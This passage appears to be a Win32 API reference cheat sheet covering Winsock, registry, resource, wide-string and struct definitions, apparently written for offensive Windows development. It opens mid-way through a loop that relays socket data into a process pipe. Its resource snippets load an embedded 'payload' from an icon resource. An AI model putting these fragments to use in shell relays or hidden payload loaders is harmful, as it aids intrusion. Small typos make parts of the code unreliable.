    while ((bytesRead = recv(params->sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        DWORD bytesWritten;
        WriteFile(params->hPipeWrite, buffer, bytesRead, &bytesWritten, NULL);
    }
    return 0;
}
```
[WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup)
```c
int WSAStartup(
    WORD wVersionRequired, 
    LPWSADATA lpWSAData
); // Initializes the Winsock library for an application. Must be called before any other Winsock functions.
```
[WSAConnect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect)
```c
int WSAConnect(
    SOCKET s, // Descriptor identifying a socket.
    const struct sockaddr* name, // Pointer to the sockaddr structure for the connection target.
    int namelen, // Length of the sockaddr structure.
    LPWSABUF lpCallerData, // Pointer to user data to be transferred during connection.
    LPWSABUF lpCalleeData, // Pointer to user data transferred back during connection.
    LPQOS lpSQOS, // Pointer to flow specs for socket s, one for each direction.
    LPQOS lpGQOS // Pointer to flow specs for the socket group.
); // Establishes a connection to another socket application.This function is similar to connect, but allows for more control over the connection process.
```
[WSASend](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasend)
```c
int WSASend(
    SOCKET s, // Descriptor identifying a connected socket.
    LPWSABUF lpBuffers, // Array of buffers for data to be sent.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
    DWORD dwFlags, // Flags to modify the behavior of the function call.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
); // Sends data on a connected socket.It can be used for both synchronous and asynchronous data transfer.
```
[WSARecv](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecv)
```c
int WSARecv(
    SOCKET s, // Descriptor identifying a connected socket.
    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
); //Receives data from a connected socket, and can also be used for both synchronous and asynchronous data transfer.
```
[WSASendTo](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasendto)
```c
int WSASendTo(
    SOCKET s, // Descriptor identifying a socket.
    LPWSABUF lpBuffers, // Array of buffers containing the data to be sent.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
    DWORD dwFlags, // Flags to modify the behavior of the function call.
    const struct sockaddr* lpTo, // Pointer to the sockaddr structure for the target address.
    int iToLen, // Size of the address in lpTo.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
); // Sends data to a specific destination, for use with connection - less socket types such as SOCK_DGRAM.
```
[WSARecvFrom](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecvfrom)
```c
int WSARecvFrom(
    SOCKET s, // Descriptor identifying a socket.
    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
    struct sockaddr* lpFrom, // Pointer to an address structure that will receive the source address upon completion of the operation.
    LPINT lpFromlen, // Pointer to the size of the lpFrom address structure.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
); //Receives data from a specific source, used with connection - less socket types such as SOCK_DGRAM.
```
[WSAAsyncSelect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaasyncselect)
```c
int WSAAsyncSelect(
    SOCKET s, // Descriptor identifying the socket.
    HWND hWnd, // Handle to the window which should receive the message.
    unsigned int wMsg, // Message to be received when an event occurs.
    long lEvent // Bitmask specifying a group of conditions to be monitored.
); // Requests Windows message - based notification of network events for a socket.
```
[socket](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket)
```c
SOCKET socket(
    int af, 
    int type, 
    int protocol
); // Creates a new socket for network communication.
```
[bind](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind)
```c
int bind(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
); // Binds a socket to a specific local address and port.
```
[listen](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-listen)
```c
int listen(
    SOCKET s, 
    int backlog
); // Sets a socket to listen for incoming connections.
```
[accept](https://learn.microsoft.com/en-us/windows/win32/api/Winsock2/nf-winsock2-accept)
```c
SOCKET accept(
    SOCKET s, 
    struct sockaddr *addr, 
    int *addrlen
); // Accepts a new incoming connection on a listening socket.
```
[connect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect)
```c
int connect(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
); // Initiates a connection on a socket to a remote address.
```
[send](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send)
```c
int send(
    SOCKET s, 
    const char *buf, 
    int len, 
    int flags
); // Sends data on a connected socket.
```
[recv](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv)
```c
int recv(
    SOCKET s, 
    char *buf, 
    int len, 
    int flags
); // Receives data from a connected socket.
```
[closesocket](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-closesocket)
```c
int closesocket(
    SOCKET s
); //Closes a socket and frees its resources.
```
[gethostbyname](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostbyname)
```c
hostent* gethostbyname(
    const char* name // either a hostname or an IPv4 address in dotted-decimal notation
); // returns a pointer to a hostent struct. NOTE: Typically better to use getaddrinfo
```

### Registry Operations
[RegOpenKeyExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw)
```c
LONG RegOpenKeyExW(
    HKEY hKey, 
    LPCWTSTR lpSubKey, 
    DWORD ulOptions, 
    REGSAM samDesired, 
    PHKEY phkResult
); // Opens the specified registry key.
```
[RegQueryValueExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvaluew)
```c
LONG RegQueryValueExW(
    HKEY hKey, 
    LPCWTSTR lpValueName, 
    LPDWORD lpReserved, 
    LPDWORD lpType, 
    LPBYTE lpData, 
    LPDWORD lpcbData
); // Retrieves the type and data of the specified value name associated with an open registry key.
```
[RegSetValueExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexw)
```c
LONG RegSetValueEx(
    HKEY hKey, 
    LPCWTSTR lpValueName, 
    DWORD Reserved, 
    DWORD dwType, 
    const BYTE *lpData, 
    DWORD cbData
); // Sets the data and type of the specified value name associated with an open registry key.
```
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)
```c
LONG RegCloseKey(
    HKEY hKey
); // Closes a handle to the specified registry key.
```
[RegCreateKeyExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa)
```c
LSTATUS RegCreateKeyExA(
  [in]            HKEY                        hKey,
  [in]            LPCSTR                      lpSubKey,
                  DWORD                       Reserved,
  [in, optional]  LPSTR                       lpClass,
  [in]            DWORD                       dwOptions,
  [in]            REGSAM                      samDesired,
  [in, optional]  const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [out]           PHKEY                       phkResult,
  [out, optional] LPDWORD                     lpdwDisposition
); // Creates the specified registry key. If the key already exists, the function opens it. Note that key names are not case sensitive. 
```
[RegSetValueExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)
```c
LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,
  [in, optional] LPCSTR     lpValueName,
                 DWORD      Reserved,
  [in]           DWORD      dwType,
  [in]           const BYTE *lpData,
  [in]           DWORD      cbData
); // Sets the data and type of a specified value under a registry key.
```
[RegCreateKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeya)
```c
LSTATUS RegCreateKeyA(
  [in]           HKEY   hKey,
  [in, optional] LPCSTR lpSubKey,
  [out]          PHKEY  phkResult
); // Creates the specified registry key. If the key already exists in the registry, the function opens it.
```
[RegDeleteKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeya)
```c
LSTATUS RegDeleteKeyA(
  [in] HKEY   hKey,
  [in] LPCSTR lpSubKey
); // Deletes a subkey and its values. Note that key names are not case sensitive.
```
[NtRenameKey](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntrenamekey)
```c
__kernel_entry NTSTATUS NtRenameKey(
  [in] HANDLE          KeyHandle,
  [in] PUNICODE_STRING NewName
); // Changes the name of the specified registry key.
```

### Error Handling
[WSAGetLastError](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsagetlasterror)
```c
int WSAGetLastError(
    void
); // Returns the error status for the last Windows Sockets operation that failed.
```
[WSASetLastError](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsasetlasterror)
```c
void WSASetLastError(
    int iError
); // Sets the error status for the last Windows Sockets operation.
```
[WSAGetOverlappedResult](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsagetoverlappedresult)
```c
BOOL WSAGetOverlappedResult(
    SOCKET s, 
    LPWSAOVERLAPPED lpOverlapped, 
    LPDWORD lpcbTransfer, 
    BOOL fWait, 
    LPDWORD lpdwFlags
); // Determines the results of an overlapped operation on the specified socket.
```
[WSAIoctl](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaioctl)
```c
int WSAIoctl(
    SOCKET s, 
    DWORD dwIoControlCode, 
    LPVOID lpvInBuffer, 
    DWORD cbInBuffer, 
    LPVOID lpvOutBuffer, 
    DWORD cbOutBuffer, 
    LPDWORD lpcbBytesReturned, 
    LPWSAOVERLAPPED lpOverlapped, 
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
); // Controls the mode of a socket.
```
[WSACreateEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsacreateevent)
```c
WSAEVENT WSACreateEvent(
    void
); // Creates a new event object.
```
[WSASetEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasetevent)
```c
BOOL WSASetEvent(
    WSAEVENT hEvent
); // Sets the state of the specified event object to signaled.
```
[WSAResetEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaresetevent)
```c
BOOL WSAResetEvent(
    WSAEVENT hEvent
); // Sets the state of the specified event object to nonsignaled.
```
[WSACloseEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsacloseevent)
```c
BOOL WSACloseEvent(
    WSAEVENT hEvent
); // Closes an open event object handle.
```
[WSAWaitForMultipleEvents](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsawaitformultipleevents)
```c
DWORD WSAWaitForMultipleEvents(
    DWORD cEvents, 
    const WSAEVENT *lphEvents, 
    BOOL fWaitAll, 
    DWORD dwTimeout, 
    BOOL fAlertable
); // Waits for multiple event objects and returns when the specified events are signaled or the time-out interval elapses.
```

### Resource Management
[FindResource](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea)
```c
HRSRC FindResource(
  [in, optional] HMODULE hModule,   // A handle to the module whose portable executable file or an accompanying MUI file contains the resource. If this parameter is NULL, the function searches the module used to create the current process.
  [in]           LPCSTR  lpName,    // The name of the resource.
  [in]           LPCSTR  lpType     // The resource type.
); // Determines the location of a resource with the specified type and name in the specified module.
```
```c
HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
```
[LoadResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource)
```c
HGLOBAL LoadResource(
  [in, optional] HMODULE hModule,    // A handle to the module whose executable file contains the resource. 
  [in]           HRSRC   hResInfo    // A handle to the resource to be loaded.
); // Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
```
```c
HGLOBAL resHandle = resHandle = LoadResource(NULL, res);
```
[LockResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource)
```c
LPVOID LockResource(
  [in] HGLOBAL hResData    // A handle to the resource to be accessed
); // Retrieves a pointer to the specified resource in memory.
```
```c
unsigned char * payload = (char *) LockResource(resHandle);
```
[SizeofResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource)
```c
DWORD SizeofResource(
  [in, optional] HMODULE hModule,    // A handle to the module whose executable file contains the resource
  [in]           HRSRC   hResInfo    // A handle to the resource. This handle must be created by using FindResource
); // Retrieves the size, in bytes, of the specified resource.
```
```c
unsigned int payload_len = SizeofResource(NULL, res);
```
---

## Unicode String Functions
```c
#include <wchar.h> // for wide character string routines
```

### String Length
```c
size_t wcslen(
    const wchar_t *str
); // Returns the length of the given wide string.
```

### String Copy
[wcscpy]
```c
wchar_t *wcscpy(
    wchar_t *dest, 
    const wchar_t *src
); // Copies the wide string from src to dest.
```
[wcsncpy]
```c
wchar_t *wcsncpy(
    wchar_t *dest, 
    const wchar_t *src, 
    size_t count
); // Copies at most count characters from the wide string src to dest.
```

### String Concatenation
[wcscat]
```c
wchar_t *wcscat(
    wchar_t *dest, 
    const wchar_t *src
); // Appends the wide string src to the end of the wide string dest.
```
[wcsncat]
```c
wchar_t *wcsncat(
    wchar_t *dest, 
    const wchar_t *src, 
    size_t count
); // Appends at most count characters from the wide string src to the end of the wide string dest.
```

### String Comparison
[wcscmp]
```c
int wcscmp(
    const wchar_t *str1, 
    const wchar_t *str2
); // Compares two wide strings lexicographically.
```
[wcsncmp]
```c
int wcsncmp(
    const wchar_t *str1, 
    const wchar_t *str2, 
    size_t count
); // Compares up to count characters of two wide strings lexicographically.
```
[_wcsicmp]
```c
int _wcsicmp(
    const wchar_t *str1, 
    const wchar_t *str2
); // Compares two wide strings lexicographically, ignoring case.
```
[_wcsnicmp]
```c
int _wcsnicmp(
    const wchar_t *str1, 
    const wchar_t *str2, 
    size_t count
); // Compares up to count characters of two wide strings lexicographically, ignoring case.
```

### String Search
[wcschr]
```c
wchar_t *wcschr(
    const wchar_t *str, 
    wchar_t c
); // Finds the first occurrence of the wide character c in the wide string str.
```
[wcsrchr]
```c
wchar_t *wcsrchr(
    const wchar_t *str, 
    wchar_t c
); // Finds the last occurrence of the wide character c in the wide string str.
```
[wcspbrk]
```c
wchar_t *wcspbrk(
    const wchar_t *str1, 
    const wchar_t *str2
); // Finds the first occurrence in the wide string str1 of any character from the wide string str2.
```
[wcsstr]
```c
wchar_t *wcsstr(
    const wchar_t *str1, 
    const wchar_t *str2
); // Finds the first occurrence of the wide string str2 in the wide string str1.
```
[wcstok]
```c
wchar_t *wcstok(
    wchar_t *str, 
    const wchar_t *delimiters
); // Splits the wide string str into tokens based on the delimiters.
```

### Character Classification and Conversion
[towupper]
```c
wint_t towupper(
    wint_t c
); // Converts a wide character to uppercase.
```
[towlower]
```c
wint_t towlower(
    wint_t c
); // Converts a wide character to lowercase.
```
[iswalpha]
```c
int iswalpha(
    wint_t c
); // Checks if the wide character is an alphabetic character.
```
[iswdigit]
```c
int iswdigit(
    wint_t c
); // Checks if the wide character is a decimal digit.
```
[iswalnum]
```c
int iswalnum(
    wint_t c
); // Checks if the wide character is an alphanumeric character.
```
[iswspace]
```c
int iswspace(
    wint_t c
); // Checks if the wide character is a whitespace character.
```
[iswxdigit]
```c
int iswxdigit(
    wint_t c
); // Checks if the wide character is a valid hexadecimal digit.
```

--- 

## Win32 Structs Cheat Sheet
### Common Structs
[**`SYSTEM_INFO`**](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info)
```cpp
#include <sysinfoapi.h>
// Contains information about the current computer system, including the architecture and type of the processor, the number of processors, and the page size.
typedef struct _SYSTEM_INFO {
    union {
        DWORD dwOemId;
        struct {
            WORD wProcessorArchitecture;
            WORD wReserved;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
} SYSTEM_INFO;
```
[**`FILETIME`**](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime)
```cpp
#include <minwinbase.h>
// Represents the number of 100-nanosecond intervals since January 1, 1601 (UTC). Used for file and system time.
typedef struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
} FILETIME;
```
[**`STARTUPINFO`**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
```cpp
#include <processthreadsapi.h>
// Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
typedef struct _STARTUPINFOA {
    DWORD  cb;
    LPSTR  lpReserved;
    LPSTR  lpDesktop;
    LPSTR  lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
```
[**`PROCESS_INFORMATION`**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
```cpp
#include <processthreadsapi.h>
// Contains information about a newly created process and its primary thread.
typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  dwProcessId;
    DWORD  dwThreadId;
} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
```
[**`PROCESSENTRY32`**](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)
```c
#include <tlhelp32.h>
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;
```

[**`SECURITY_ATTRIBUTES`**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85))
```cpp
// Determines whether the handle can be inherited by child processes and specifies a security descriptor for a new object.
typedef struct _SECURITY_ATTRIBUTES {
    DWORD  nLength;
    LPVOID lpSecurityDescriptor;
    BOOL   bInheritHandle;
} SECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
```
[**`OVERLAPPED`**](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-overlapped)
```cpp
#inluce <minwinbase.h>
// Contains information used in asynchronous (also known as overlapped) input and output (I/O) operations.
typedef struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union {
        struct {
            DWORD Offset;
            DWORD OffsetHigh;
        } DUMMYSTRUCTNAME;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    HANDLE hEvent;
} OVERLAPPED, *LPOVERLAPPED;
```
[**`GUID`**](https://docs.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid)
```cpp
#include <guiddef.h>
// Represents a globally unique identifier (GUID), used to identify objects, interfaces, and other items.
typedef struct _GUID {
    unsigned long  Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char  Data4[8];
} GUID;
```
[**`MEMORY_BASIC_INFORMATION`**](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information)
```cpp
#include <winnt.h>
// Contains information about a range of pages in the virtual address space of a process.
typedef struct _MEMORY_BASIC_INFORMATION {
    PVOID  BaseAddress;
    PVOID  AllocationBase;
    DWORD  AllocationProtect;
    SIZE_T RegionSize;
    DWORD  State;
    DWORD  Protect;
    DWORD  Type;
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
```
[**`SYSTEMTIME`**](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-systemtime)
```cpp
#include <minwinbase.h>
// Specifies a date and time, using individual members for the month, day, year, weekday, hour, minute, second, and millisecond.
typedef struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
} SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME;
```
[**`COORD`**](https://docs.microsoft.com/en-us/windows/console/coord-str)
```cpp
// Defines the coordinates of a character cell in a console screen buffer, where the origin (0,0) is at the top-left corner.
typedef struct _COORD {
    SHORT X;
    SHORT Y;
} COORD, *PCOORD;
```
[**`SMALL_RECT`**](https://docs.microsoft.com/en-us/windows/console/small-rect-str)
```cpp
//  Defines the coordinates of the upper left and lower right corners of a rectangle.
typedef struct _SMALL_RECT {
    SHORT Left;
    SHORT Top;
    SHORT Right;
    SHORT Bottom;
} SMALL_RECT;
```
[**`CONSOLE_SCREEN_BUFFER_INFO`**](https://docs.microsoft.com/en-us/windows/console/console-screen-buffer-info-str)
```cpp
// Contains information about a console screen buffer.
typedef struct _CONSOLE_SCREEN_BUFFER_INFO {
    COORD      dwSize;
    COORD      dwCursorPosition;
    WORD       wAttributes;
    SMALL_RECT srWindow;
    COORD      dwMaximumWindowSize;
} CONSOLE_SCREEN_BUFFER_INFO, *PCONSOLE_SCREEN_BUFFER_INFO;
```
[**`WSADATA`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata)
```cpp
#include <winsock.h>
// Contains information about the Windows Sockets implementation.
typedef struct WSAData {
    WORD           wVersion;
    WORD           wHighVersion;
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char FAR       *lpVendorInfo;
    char           szDescription[WSADESCRIPTION_LEN+1];
    char           szSystemStatus[WSASYS_STATUS_LEN+1];
} WSADATA, *LPWSADATA;
```
[**`CRITICAL_SECTION`**]([struct RTL_CRITICAL_SECTION (nirsoft.net)](https://www.nirsoft.net/kernel_struct/vista/RTL_CRITICAL_SECTION.html))
```c++
// Represents a critical section object, which is used to provide synchronization access to a shared resource.
typedef struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
} RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;
```
[**`WSAPROTOCOL_INFO`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa)
```c++
#include <winsock2.h>
// Contains Windows Sockets protocol information.
typedef struct _WSAPROTOCOL_INFOA {
    DWORD          dwServiceFlags1;
    DWORD          dwServiceFlags2;
    DWORD          dwServiceFlags3;
    DWORD          dwServiceFlags4;
    DWORD          dwProviderFlags;
    GUID           ProviderId;
    DWORD          dwCatalogEntryId;
    WSAPROTOCOLCHAIN ProtocolChain;
    int            iVersion;
    int            iAddressFamily;
    int            iMaxSockAddr;
    int            iMinSockAddr;
    int            iSocketType;
    int            iProtocol;
    int            iProtocolMaxOffset;
    int            iNetworkByteOrder;
    int            iSecurityScheme;
    DWORD          dwMessageSize;
    DWORD          dwProviderReserved;
    CHAR           szProtocol[WSAPROTOCOL_LEN+1];
} WSAPROTOCOL_INFOA, *LPWSAPROTOCOL_INFOA;
```
[**`MSGHDR`**](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/ns-ws2tcpip-_msghdr)
```c++
#include <ws2def.h>
// Contains message information for use with the `sendmsg` and `recvmsg` functions.
typedef struct _WSAMSG {
    LPSOCKADDR       name;
    INT              namelen;
    LPWSABUF         lpBuffers;
    ULONG            dwBufferCount;
    WSABUF           Control;
    ULONG            dwFlags;
} WSAMSG, *PWSAMSG, *LPWSAMSG;
```

### Win32 Sockets Structs Cheat Sheet (winsock.h)
[**`SOCKADDR`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr)
```cpp
// A generic socket address structure used for compatibility with various address families.
typedef struct sockaddr {
    u_short sa_family;
    char    sa_data[14];
} SOCKADDR, *PSOCKADDR, *LPSOCKADDR;
```
[**`SOCKADDR_IN`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in)
```cpp
// Represents an IPv4 socket address, containing the IPv4 address, port number, and address family.
typedef struct sockaddr_in {
    short          sin_family;
    u_short        sin_port;
    struct in_addr sin_addr;
    char           sin_zero[8];
} SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN;
```
[**`LINGER`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-linger)
```cpp
// Used to set the socket option SO_LINGER, which determines the action taken when unsent data is queued on a socket and a `closesocket` is performed.
typedef struct linger {
    u_short l_onoff;
    u_short l_linger;
} LINGER, *PLINGER, *LPLINGER;
```
[**`TIMEVAL`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-timeval)
```cpp
// Represents a time interval, used with the `select` function to specify a timeout period.
typedef struct timeval {
    long tv_sec;
    long tv_usec;
} TIMEVAL, *PTIMEVAL, *LPTIMEVAL;
```
[**`FD_SET`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-fd_set)
```cpp
// Represents a set of sockets used with the `select` function to check for socket events.
typedef struct fd_set {
    u_int fd_count;
    SOCKET fd_array[FD_SETSIZE];
} fd_set, *Pfd_set, *LPfd_set;
```

### Win32 Sockets Structs Cheat Sheet (winsock2.h)
[**`IN_ADDR`**](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr)
```cpp
// Represents an IPv4 address.
typedef struct in_addr {
    union {
        struct {
            u_char s_b1, s_b2, s_b3, s_b4;
        } S_un_b;
        struct {
            u_short s_w1, s_w2;
        } S_un_w;
        u_long S_addr;
    } S_un;
} IN_ADDR, *PIN_ADDR, *LPIN_ADDR;
```

### Win32 Sockets Structs Cheat Sheet (ws2def.h)
[**`ADDRINFO`**](https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-addrinfow)
```cpp
#include <ws2def.h>
// Contains information about an address for use with the `getaddrinfo` function, and is used to build a linked list of addresses.
typedef struct addrinfoW {
    int             ai_flags;
    int             ai_family;
    int             ai_socktype;
    int             ai_protocol;
    size_t          ai_addrlen;
    PWSTR           *ai_canonname;
    struct sockaddr *ai_addr;
    struct addrinfo *ai_next;
} ADDRINFOW, *PADDRINFOW;
```
[**`WSABUF`**](https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-wsabuf)
```cpp
#include <ws2def.h>
// Contains a pointer to a buffer and its length. Used for scatter/gather I/O operations.
typedef struct _WSABUF {
    ULONG len;
    __field_bcount(len) CHAR FAR *buf;
} WSABUF, FAR * LPWSABUF;
```
[**`SOCKADDR_IN6`**](https://docs.microsoft.com/en-us/windows/win32/api/ws2ipdef/ns-ws2ipdef-sockaddr_in6)
```cpp
#include <ws2ipdef.h>
// Represents an IPv6 socket address, containing the IPv6 address, port number, flow info, and address family.
typedef struct sockaddr_in6 {
    short          sin6_family;
    u_short        sin6_port;
    u_long         sin6_flowinfo;
    struct in6_addr sin6_addr;
    u_long         sin6_scope_id;
} SOCKADDR_IN6, *PSOCKADDR_IN6, *LPSOCKADDR_IN6;
```
[**`IN6_ADDR`**](https://learn.microsoft.com/en-us/windows/win32/api/in6addr/ns-in6addr-in6_addr)
```cpp
#include <in6addr.h>
// Represents an IPv6 address.
typedef struct in6_addr {
    union {
        u_char Byte[16];
        u_short Word[8];
    } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;
```
